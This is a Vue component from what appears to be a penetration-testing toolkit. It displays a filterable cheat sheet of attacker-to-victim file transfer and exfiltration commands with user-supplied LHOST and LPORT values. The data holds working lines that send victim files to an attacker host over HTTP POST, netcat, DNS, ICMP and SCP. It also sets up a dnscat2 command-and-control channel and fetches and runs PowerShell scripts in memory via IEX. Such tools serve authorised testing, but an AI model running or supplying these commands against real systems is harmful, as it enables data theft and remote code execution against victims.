<template>
    <HeightResize v-slot="{ height }">
        <div :style="{ height: height + 'px' }" style="overflow: auto; padding: 5px;">
            <!-- 控制面板：LHOST/LPORT 输入 + 分类筛选 + 搜索 -->
            <Display>
                <Align direction="vertical">
                    <Input
                        v-model="action.current.lhost"
                        :label="$t('dataExfil_lhost')"
                        placeholder="10.10.10.1"
                    />
                    <Input
                        v-model="action.current.lport"
                        :label="$t('dataExfil_lport')"
                        placeholder="8080"
                    />
                    <Select
                        v-model="action.current.selectedCategory"
                        :label="$t('dataExfil_category')"
                        :options="categoryOptions"
                    />
                    <Input
                        v-model="action.current.search"
                        :label="$t('dataExfil_search')"
                        :placeholder="$t('dataExfil_search_placeholder')"
                    />
                </Align>
            </Display>

            <!-- 结果统计 -->
            <div v-if="filteredMethods.length > 0" class="sectool-exfil-count">
                {{ $t('dataExfil_result_count', [filteredMethods.length]) }}
            </div>

            <!-- 按方法逐项展示 -->
            <template v-for="method in filteredMethods" :key="method.id">
                <div class="sectool-exfil-method-header">
                    <span class="sectool-exfil-method-name">{{ method.name }}</span>
                    <span class="sectool-exfil-method-badge">{{ method.category }}</span>
                </div>
                <div v-if="method.description" class="sectool-exfil-method-desc">
                    {{ method.description }}
                </div>
                <template v-for="(cmd, idx) in method.commands" :key="method.id + '-' + idx">
                    <Textarea
                        :model-value="renderCmd(cmd.cmd)"
                        :height="42"
                        :placeholder="cmd.label"
                        :copy="method.name + ' - ' + cmd.label"
                    />
                </template>
            </template>

            <!-- 无匹配结果 -->
            <div v-if="filteredMethods.length === 0" class="sectool-exfil-empty">
                {{ $t('dataExfil_empty') }}
            </div>
        </div>
    </HeightResize>
</template>

<script lang="ts" setup>
import { useAction, initialize } from "@/store/action"

// ================ 数据传输方法类型定义 ================ //

interface ExfilCommand {
    label: string
    cmd: string
}

interface ExfilMethod {
    id: string
    name: string
    category: string
    description: string
    commands: ExfilCommand[]
}

// ================ 内联数据：所有传输方法 ================ //

const exfilMethods: ExfilMethod[] = [
    // ========== HTTP ========== //
    {
        id: "http_python_wget",
        name: "Python HTTP Server + wget",
        category: "HTTP",
        description: "Host files with Python built-in HTTP server, download with wget",
        commands: [
            { label: "Attacker (Server)", cmd: "python3 -m http.server {{LPORT}}" },
            { label: "Victim (Download)", cmd: "wget http://{{LHOST}}:{{LPORT}}/file -O outfile" },
        ],
    },
    {
        id: "http_python_curl",
        name: "Python HTTP Server + curl",
        category: "HTTP",
        description: "Host files with Python HTTP server, download with curl",
        commands: [
            { label: "Attacker (Server)", cmd: "python3 -m http.server {{LPORT}}" },
            { label: "Victim (Download)", cmd: "curl http://{{LHOST}}:{{LPORT}}/file -o outfile" },
        ],
    },
    {
        id: "http_curl_post",
        name: "curl POST Upload",
        category: "HTTP",
        description: "Exfiltrate file via HTTP POST request",
        commands: [
            { label: "Attacker (Listener)", cmd: "nc -lvnp {{LPORT}}" },
            { label: "Victim (Upload)", cmd: "curl --data-binary @/path/to/file http://{{LHOST}}:{{LPORT}}" },
        ],
    },
    {
        id: "http_php",
        name: "PHP Built-in Server",
        category: "HTTP",
        description: "Host files with PHP built-in web server",
        commands: [
            { label: "Attacker (Server)", cmd: "php -S 0.0.0.0:{{LPORT}}" },
            { label: "Victim (Download)", cmd: "wget http://{{LHOST}}:{{LPORT}}/file -O outfile" },
        ],
    },
    {
        id: "http_certutil",
        name: "certutil (Windows)",
        category: "HTTP",
        description: "Download files on Windows using certutil",
        commands: [
            { label: "Attacker (Server)", cmd: "python3 -m http.server {{LPORT}}" },
            { label: "Victim (Windows)", cmd: "certutil -urlcache -split -f http://{{LHOST}}:{{LPORT}}/file outfile" },
        ],
    },

    // ========== SMB ========== //
    {
        id: "smb_impacket_copy",
        name: "impacket-smbserver + copy",
        category: "SMB",
        description: "Host SMB share with impacket, copy files from Windows",
        commands: [
            { label: "Attacker (Server)", cmd: "impacket-smbserver share /path/to/share -smb2support" },
            { label: "Victim (Windows)", cmd: "copy \\\\{{LHOST}}\\share\\file ." },
        ],
    },
    {
        id: "smb_smbclient",
        name: "smbclient",
        category: "SMB",
        description: "Access SMB share from Linux with smbclient",
        commands: [
            { label: "Attacker (Server)", cmd: "impacket-smbserver share /path/to/share -smb2support" },
            { label: "Victim (Linux)", cmd: "smbclient //{{LHOST}}/share -N -c 'get file'" },
        ],
    },
    {
        id: "smb_net_use",
        name: "net use (Windows)",
        category: "SMB",
        description: "Map SMB share as network drive on Windows",
        commands: [
            { label: "Attacker (Server)", cmd: "impacket-smbserver share /path/to/share -smb2support" },
            { label: "Victim (Windows)", cmd: "net use Z: \\\\{{LHOST}}\\share && copy Z:\\file ." },
        ],
    },

    // ========== DNS ========== //
    {
        id: "dns_nslookup",
        name: "nslookup Exfil",
        category: "DNS",
        description: "Exfiltrate data via DNS queries using nslookup",
        commands: [
            { label: "Attacker (Listener)", cmd: "sudo tcpdump -i eth0 udp port 53" },
            { label: "Victim", cmd: "nslookup $(cat /etc/hostname).{{LHOST}}" },
        ],
    },
    {
        id: "dns_dig",
        name: "dig Exfil",
        category: "DNS",
        description: "Exfiltrate data via DNS queries using dig",
        commands: [
            { label: "Attacker (Listener)", cmd: "sudo tcpdump -i eth0 udp port 53" },
            { label: "Victim", cmd: "dig @{{LHOST}} $(cat /etc/hostname).exfil.com" },
        ],
    },
    {
        id: "dns_dnscat2",
        name: "dnscat2",
        category: "DNS",
        description: "Encrypted C2 channel over DNS",
        commands: [
            { label: "Attacker (Server)", cmd: "dnscat2 --dns server=0.0.0.0 --secret=secret" },
            { label: "Victim (Client)", cmd: "dnscat2 --dns server={{LHOST}} --secret=secret" },
        ],
    },

    // ========== ICMP ========== //
    {
        id: "icmp_ping",
        name: "ping Exfil",
        category: "ICMP",
        description: "Exfiltrate data by encoding it in ICMP ping packets",
        commands: [
            { label: "Attacker (Listener)", cmd: "sudo tcpdump -i eth0 icmp" },
            { label: "Victim", cmd: "xxd -p -c 16 /path/to/file | while read line; do ping -c 1 -p $line {{LHOST}}; done" },
        ],
    },
    {
        id: "icmp_hping3",
        name: "hping3",
        category: "ICMP",
        description: "Transfer file contents via ICMP packets using hping3",
        commands: [
            { label: "Attacker (Listener)", cmd: "sudo tcpdump -i eth0 icmp" },
            { label: "Victim", cmd: "hping3 -1 -E /path/to/file -d 100 {{LHOST}}" },
        ],
    },

    // ========== Netcat ========== //
    {
        id: "nc_to_victim",
        name: "Netcat (Attacker \u2192 Victim)",
        category: "Netcat",
        description: "Transfer file from attacker to victim using netcat",
        commands: [
            { label: "Attacker (Sender)", cmd: "nc -lvnp {{LPORT}} < file" },
            { label: "Victim (Receiver)", cmd: "nc {{LHOST}} {{LPORT}} > outfile" },
        ],
    },
    {
        id: "nc_to_attacker",
        name: "Netcat (Victim \u2192 Attacker)",
        category: "Netcat",
        description: "Exfiltrate file from victim to attacker using netcat",
        commands: [
            { label: "Attacker (Listener)", cmd: "nc -lvnp {{LPORT}} > file" },
            { label: "Victim (Sender)", cmd: "nc -w 3 {{LHOST}} {{LPORT}} < /path/to/file" },
        ],
    },

    // ========== PowerShell ========== //
    {
        id: "ps_iwr",
        name: "Invoke-WebRequest",
        category: "PowerShell",
        description: "Download file using PowerShell Invoke-WebRequest",
        commands: [
            { label: "Attacker (Server)", cmd: "python3 -m http.server {{LPORT}}" },
            { label: "Victim (PowerShell)", cmd: "Invoke-WebRequest -Uri http://{{LHOST}}:{{LPORT}}/file -OutFile outfile" },
        ],
    },
    {
        id: "ps_iex",
        name: "IEX (In-Memory)",
        category: "PowerShell",
        description: "Download and execute PowerShell script in memory",
        commands: [
            { label: "Attacker (Server)", cmd: "python3 -m http.server {{LPORT}}" },
            { label: "Victim (PowerShell)", cmd: "IEX(New-Object Net.WebClient).DownloadString('http://{{LHOST}}:{{LPORT}}/script.ps1')" },
        ],
    },
    {
        id: "ps_bits",
        name: "Start-BitsTransfer",
        category: "PowerShell",
        description: "Download file using BITS transfer service",
        commands: [
            { label: "Attacker (Server)", cmd: "python3 -m http.server {{LPORT}}" },
            { label: "Victim (PowerShell)", cmd: "Start-BitsTransfer -Source http://{{LHOST}}:{{LPORT}}/file -Destination outfile" },
        ],
    },
    {
        id: "ps_webclient",
        name: ".NET WebClient",
        category: "PowerShell",
        description: "Download file using .NET WebClient class",
        commands: [
            { label: "Attacker (Server)", cmd: "python3 -m http.server {{LPORT}}" },
            { label: "Victim (PowerShell)", cmd: "(New-Object Net.WebClient).DownloadFile('http://{{LHOST}}:{{LPORT}}/file','outfile')" },
        ],
    },

    // ========== SCP/SSH ========== //
    {
        id: "scp_upload",
        name: "SCP Upload",
        category: "SCP/SSH",
        description: "Upload file from victim to attacker via SCP",
        commands: [
            { label: "Victim (Sender)", cmd: "scp /path/to/file user@{{LHOST}}:/tmp/" },
        ],
    },
    {
        id: "scp_download",
        name: "SCP Download",
        category: "SCP/SSH",
        description: "Download file from attacker to victim via SCP",
        commands: [
            { label: "Victim (Receiver)", cmd: "scp user@{{LHOST}}:/path/to/file /tmp/" },
        ],
    },
    {
        id: "ssh_tar",
        name: "SSH + tar",
        category: "SCP/SSH",
        description: "Compress and transfer directory via SSH pipe",
        commands: [
            { label: "Victim (Sender)", cmd: "tar czf - /path/to/dir | ssh user@{{LHOST}} 'cat > /tmp/archive.tar.gz'" },
        ],
    },

    // ========== Base64 ========== //
    {
        id: "b64_linux",
        name: "Base64 (Linux)",
        category: "Base64",
        description: "Encode file to base64, transfer as text, decode on the other side",
        commands: [
            { label: "Encode (Sender)", cmd: "base64 -w0 /path/to/file" },
            { label: "Decode (Receiver)", cmd: "echo '<base64_data>' | base64 -d > file" },
        ],
    },
    {
        id: "b64_powershell",
        name: "Base64 (PowerShell)",
        category: "Base64",
        description: "Encode file to base64 on Windows using PowerShell",
        commands: [
            { label: "Encode (PowerShell)", cmd: "[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\path\\to\\file'))" },
            { label: "Decode (Linux)", cmd: "echo '<base64_data>' | base64 -d > file" },
        ],
    },

    // ========== FTP ========== //
    {
        id: "ftp_python",
        name: "Python FTP Server",
        category: "FTP",
        description: "Quick FTP server using Python pyftpdlib",
        commands: [
            { label: "Attacker (Server)", cmd: "python3 -m pyftpdlib -p 21 -w" },
            { label: "Victim (Client)", cmd: "ftp {{LHOST}}" },
        ],
    },
    {
        id: "ftp_windows_script",
        name: "FTP Script (Windows)",
        category: "FTP",
        description: "Automated FTP download on Windows via script file",
        commands: [
            { label: "Attacker (Server)", cmd: "python3 -m pyftpdlib -p 21 -w" },
            { label: "Victim (Windows)", cmd: "echo open {{LHOST}}> ftp.txt&echo user anonymous pass>> ftp.txt&echo binary>> ftp.txt&echo GET file>> ftp.txt&echo bye>> ftp.txt&ftp -s:ftp.txt" },
        ],
    },
]

// ================ 分类下拉选项（从数据中自动提取） ================ //

const allCategories = [...new Set(exfilMethods.map(m => m.category))]
const categoryOptions = [
    { value: "_all", label: "All" },
    ...allCategories.map(c => ({ value: c, label: c })),
]

// ================ 状态管理 ================ //

const action = useAction(await initialize({
    lhost: "",
    lport: "",
    selectedCategory: "_all",
    search: "",
}))

// ================ 占位符替换：将 {{LHOST}} 和 {{LPORT}} 替换为用户输入 ================ //

const renderCmd = (cmd: string): string => {
    let result = cmd
    const lhost = action.current.lhost || "{{LHOST}}"
    const lport = action.current.lport || "{{LPORT}}"
    result = result.replace(/\{\{LHOST\}\}/g, lhost)
    result = result.replace(/\{\{LPORT\}\}/g, lport)
    return result
}

// ================ 搜索与分类过滤 ================ //

const filteredMethods = $computed((): ExfilMethod[] => {
    const keyword = (action.current.search || "").toLowerCase().trim()
    const catFilter = action.current.selectedCategory

    return exfilMethods.filter(method => {
        if (catFilter !== "_all" && method.category !== catFilter) return false
        if (keyword) {
            return method.name.toLowerCase().includes(keyword)
                || method.category.toLowerCase().includes(keyword)
                || method.description.toLowerCase().includes(keyword)
                || method.commands.some(c => c.cmd.toLowerCase().includes(keyword))
        }
        return true
    })
})
</script>

<style scoped>
.sectool-exfil-count {
    font-size: 11px;
    color: var(--sectool-text-tertiary);
    margin: 0 0 4px 2px;
}

.sectool-exfil-method-header {
    display: flex;
    align-items: center;
    gap: 8px;
    margin: 10px 0 2px 2px;
}

.sectool-exfil-method-name {
    font-size: 12px;
    font-weight: 600;
    color: var(--sectool-text-secondary);
    letter-spacing: 0.3px;
}

.sectool-exfil-method-badge {
    font-size: 10px;
    font-weight: 500;
    color: var(--sectool-text-tertiary);
    background: var(--sectool-bg-secondary, rgba(127, 127, 127, 0.1));
    padding: 1px 6px;
    border-radius: 3px;
}

.sectool-exfil-method-desc {
    font-size: 11px;
    color: var(--sectool-text-tertiary);
    margin: 0 0 4px 2px;
    line-height: 1.4;
}

.sectool-exfil-empty {
    font-size: 12px;
    color: var(--sectool-text-tertiary);
    text-align: center;
    padding: 40px 0;
}
</style>
